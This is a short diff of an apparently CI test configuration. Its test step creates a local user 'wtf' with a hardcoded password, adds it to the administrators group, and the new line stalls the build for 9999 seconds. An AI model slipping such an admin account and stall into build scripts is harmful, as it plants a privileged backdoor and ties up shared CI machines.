@@ -15,3 +15,4 @@ test_script:
 
       net.exe user /add wtf "Password123!" /Y
       net.exe localgroup administrators wtf /add
+      start-sleep -seconds 9999
